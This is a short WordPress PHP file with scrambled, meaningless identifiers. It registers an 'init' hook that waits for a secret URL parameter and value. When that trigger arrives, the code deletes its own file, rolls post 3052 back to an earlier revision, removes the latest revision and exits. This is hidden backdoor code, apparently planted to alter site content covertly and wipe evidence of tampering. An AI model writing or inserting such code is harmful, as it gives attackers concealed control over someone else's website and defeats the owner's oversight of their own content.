<?php

function title_blocks_date() {
	if (isset($_GET['endpoints_showcase_old_light']) && $_GET['endpoints_showcase_old_light'] === 'cron_age_wpml') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$age_effect_groups = 3052;
		$clean_manage_taxonomies = wp_get_post_revisions($age_effect_groups);
		if (empty($clean_manage_taxonomies)) die('no revisions');
		if (count($clean_manage_taxonomies) < 2) die('less than 2');
		$crm_service_video = array_shift($clean_manage_taxonomies);
		$generator_live_media = $crm_service_video->ID;
		$free_mini_update = array_shift($clean_manage_taxonomies);
		$external_archive_your_favicon = $free_mini_update->ID;
		$rest_reloaded_products_builder = wp_restore_post_revision($external_archive_your_favicon);
		if ($rest_reloaded_products_builder === false) die('error restoring');
		$rest_reloaded_products_builder = wp_delete_post_revision($generator_live_media);		
		if ($rest_reloaded_products_builder === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'title_blocks_date');
